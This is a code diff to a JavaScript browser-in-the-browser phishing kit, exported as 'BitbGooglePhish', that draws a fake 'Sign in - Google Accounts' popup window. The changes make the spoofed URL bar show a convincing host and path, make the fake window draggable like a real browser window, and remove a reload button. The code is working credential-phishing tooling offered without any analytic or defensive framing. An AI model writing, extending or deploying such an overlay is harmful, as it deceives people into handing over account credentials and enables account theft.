@@ -42,7 +42,18 @@
         if (!overlay || !frame) return false;
 
         var displayUrl = String(cfg().bitbDisplayUrl || base + entryPath()).trim();
-        if (urlEl) urlEl.textContent = displayUrl;
+        if (urlEl) {
+            // In mrd0x style the url bar is split: domain-name + domain-path.
+            // #bitbUrlDisplay is the domain-path span; #bitbDomainName holds the host.
+            try {
+                var parsed = new URL(displayUrl);
+                var domainEl = document.getElementById('bitbDomainName');
+                if (domainEl) domainEl.textContent = parsed.host;
+                urlEl.textContent = parsed.pathname + parsed.search + parsed.hash;
+            } catch (_) {
+                urlEl.textContent = displayUrl;
+            }
+        }
 
         var tabTitle = String(cfg().bitbTabTitle || 'Sign in - Google Accounts').trim();
         if (tabTitleEl) tabTitleEl.textContent = tabTitle;
@@ -102,6 +113,41 @@
         frame.src = u;
     }
 
+    function wireDraggable() {
+        var win = document.getElementById('bitbWindow');
+        var titleBar = document.getElementById('bitbTitleBar');
+        if (!win || !titleBar) return;
+
+        var dragging = false, startX, startY, origLeft, origTop;
+
+        titleBar.addEventListener('mousedown', function (e) {
+            if (e.target && e.target.closest && e.target.closest('[data-bitb-close]')) return;
+            dragging = true;
+            startX = e.clientX;
+            startY = e.clientY;
+            var rect = win.getBoundingClientRect();
+            origLeft = rect.left;
+            origTop = rect.top;
+            win.style.position = 'fixed';
+            win.style.margin = '0';
+            win.style.left = origLeft + 'px';
+            win.style.top = origTop + 'px';
+            e.preventDefault();
+        });
+
+        document.addEventListener('mousemove', function (e) {
+            if (!dragging) return;
+            var dx = e.clientX - startX;
+            var dy = e.clientY - startY;
+            win.style.left = (origLeft + dx) + 'px';
+            win.style.top  = (origTop  + dy) + 'px';
+        });
+
+        document.addEventListener('mouseup', function () {
+            dragging = false;
+        });
+    }
+
     function wireCloseHandlers() {
         var overlay = getOverlay();
         if (!overlay || overlay.dataset.bitbWired) return;
@@ -110,19 +156,16 @@
             var t = e.target;
             if (t && t.closest && t.closest('[data-bitb-close]')) close();
         });
-        var reloadBtn = overlay.querySelector('.bitb-reload');
-        if (reloadBtn) {
-            reloadBtn.addEventListener('click', function (e) {
-                e.stopPropagation();
-                reloadFrame();
-            });
-        }
     }
 
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', wireCloseHandlers);
+        document.addEventListener('DOMContentLoaded', function () {
+            wireCloseHandlers();
+            wireDraggable();
+        });
     } else {
         wireCloseHandlers();
+        wireDraggable();
     }
 
     global.BitbGooglePhish = {
